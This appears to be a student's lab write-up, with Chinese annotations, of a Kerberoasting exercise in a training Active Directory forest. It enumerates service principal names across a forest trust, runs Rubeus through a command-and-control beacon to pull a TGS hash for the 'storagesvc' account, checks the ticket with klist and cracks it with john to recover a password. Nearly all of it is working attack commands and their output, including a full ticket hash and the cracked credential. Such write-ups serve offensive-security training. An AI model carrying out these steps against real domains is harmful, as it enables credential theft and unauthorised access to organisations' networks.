Task
•  Find a service account in the eu.local forest and Kerberoast its password.


使用Active Directory module枚举spn

```
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\Windows\system32> Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}


DistinguishedName    : CN=storagesvc,CN=Users,DC=eu,DC=local
Enabled              : True
GivenName            : storage
Name                 : storagesvc
ObjectClass          : user
ObjectGUID           : 041fedb0-a442-4cdf-af34-6559480a2d74
SamAccountName       : storagesvc
ServicePrincipalName : {MSSQLSvc/eu-file.eu.local}
SID                  : S-1-5-21-3657428294-2017276338-1274645009-1106
Surname              : svc
UserPrincipalName    : storagesvc
```

留意这个spn属于外域eu.local，用户是storagesvc
```
MSSQLSvc/eu-file.eu.local
```


请求一个这个用户的tgs

```
beacon> execute-assembly tools/Rubeus-master/Rubeus/bin/Debug/Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local
[*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local
[+] host called home, sent: 402067 bytes
[+] received output:


   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.1 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.

[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.



[*] Target User            : storagesvc
[*] Target Domain          : eu.local
[+] received output:
[*] Searching path 'LDAP://eu.local/DC=eu,DC=local' for Kerberoastable users

[*] Total kerberoastable users : 1

$krb5tgs$23$*storagesvc$eu.local$MSSQLSvc/eu-file.eu.local@eu.local*$A34D0E465F5D946A2B429197050D620C$15F5C8CF8DC9C6FC503B203EDC6F5CB6DAB42881AECEE0C9A878A3970696E0E112AE429F28CC52A80CCF2195C7482E5299B78FFBE68B610EC9287CD4CCB37D455D4E55282E842986D865AB001CF9157AE1EE6BBE5BF8FE299F7A4A510F308D3F729A0653BD11FB3D7569D2FF770BAA70CFBD929D578962B6CF30D4B0276936AF4C02B11DCC833AFAF63E87EA820EC21A669D874FCE0E4BF51DD184A684238CD2963619CD512DEE62CDFDB53A66095226B3FAE8CFF371166CA5158176D55FE158A87AD29925244FED8076272508ECD1C1956B12436D88AC063F8D03FDB82339A03B038AE6FE3D796915FAD1D06A70BDF18CD7AA2A1084C6D36007A8E0794B53927F7035991C6D035A8A3ADFD763976DC9DAC1752D2F645BEC00BE6CF67AE3DDFC438FD604ED3F8D9520F0BA8A176F1DB9821D2BCF6C3EB37CC19B5D67BC2FDBD3C6B264779971E08EC4117D45B0072262FC79FE107CBAD14580BC444354B0FDA8D21B9A68DC37AEFCD67BF67FBD946B9793B8D9E9770A428D5B2BBB59A919DD7E843BF24E1510F41410FE8E5E4B7919AA99FB5F4C761080F21B95791C20F328AFE3222B6ED122A6FF0BF9B41386FD7E60DEAC1749B1F8FA84424A4317F9F9C9EAE10D1E0B24799113F020417AA5578ADFF2A313A647C8571E700B6C526D50DA9BC1C262FFB64EBAA150DB5854EB9194CC51FE0871D667DE9928282ED14B9BFECF4DB77AAD0F9F0948039EF12C332AD0BC9C6C677846BAE075DE4358D13E62BF2D0756B96CD65C397010639082B691482B4775062FC8C7BD2EC56E21ABFAC016B2C80E84E38A55C2EEC3E4CF3D1E765FA6CEA0B3A4F04A6131F89351D8097C7D683613A7A04150D53B4C96312DF604788ADEC45D4C9C31BAF2B125DCF4511ACAE6AD5F48B3D510D62923F9556B288369777891960A700E99ACBEEE867DDA244639BE4BE99BCBEA89D76478EA3A47C274B7EE44AE9B2DC76C2101BEF3900E7E5D1133B41264E498D84634E4FC12AD380EC4BBF8F697ECBB66176C524513535BD8EDD36194626E9DF5AEC33CE6EA793773265D26C5346B7AC1C52FE18C0F586C3350D7C46B762ECB9C0E930C7FBA765D665CC99A84264CCCB16BAA8011EBF6AB75A9E40E4FABBF7EA46CE683A5CDE488329705578DA8A5420605E9C78A8F545FA944F974A1941849D676F04B391E78282E6F49B0D68C87F1A38C8D4AA886BBB4D01D0C0B3887F90E0586E3B72D411BB901DCA3DA839DF3FFA10695A4BE63A075BAB68AEA8CC0272F2261094A73BB337444116914DF0AE0456735F8A8393068A9B6412FF87BDD03E380323E09A5352162CC40D5512A8AF0E1A0BE51D3DCA44003AD6507B014A86810D6CA0F43DD4FA826E81A4721055FC201925BA327561F3A4917D5FCE1D03ADBFBB7D9004D78B9A974E2B59387AC1FBE657E97DAE23F094E01CD369498E5A8877A3C5C033D956686ACBCE55F2565B786E4EB0445B75725FEF92C92DB174122C0D9589FECF17506D4675CF98E2CC06D4F75FFB12797280DEC9D63977CBDD16EB0C9C23785C70565591AEB5BD2ECB0A50E9637F4021F4A654419E64B04650E6C71F8B09D343C29DA6A9F0CE9A07655A0B4EDA4F2B6345253AA70DBE7A6F82C2E36410C043DE51B280BD5CA8028C4D4FBD5050FA2EF3035FA32F6AC2DA2AEA895B38372DD9A6D13AE48FB37A30766007E3B1B4437F587FF3BEEE84BBF02149AD10DFD6D9D85DB22D4C995945A7AC3


```

klist查看

```
beacon> run klist
[*] Tasked beacon to run: klist
[+] host called home, sent: 23 bytes
[+] received output:
Current LogonId is 0:0x6b6ccd8
Cached Tickets: (6)

#3>	Client: studentuser138 @ US.TECHCORP.LOCAL
	Server: MSSQLSvc/eu-file.eu.local @ EU.LOCAL
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
	Start Time: 11/17/2022 6:34:42 (local)
	End Time:   11/17/2022 16:33:05 (local)
	Renew Time: 11/24/2022 6:33:05 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x200 -> DISABLE-TGT-DELEGATION
	Kdc Called: EU-DC.eu.local
```

破解这个spn
```
┌──(root㉿kali)-[~]
└─# john hash.txt --wordlist=/root/cs4.7/tools/kerberoast/10k-worst-pass.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Qwerty@123       (?)     
1g 0:00:00:00 DONE (2022-11-17 09:39) 100.0g/s 51200p/s 51200c/s 51200C/s password..nirvana
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```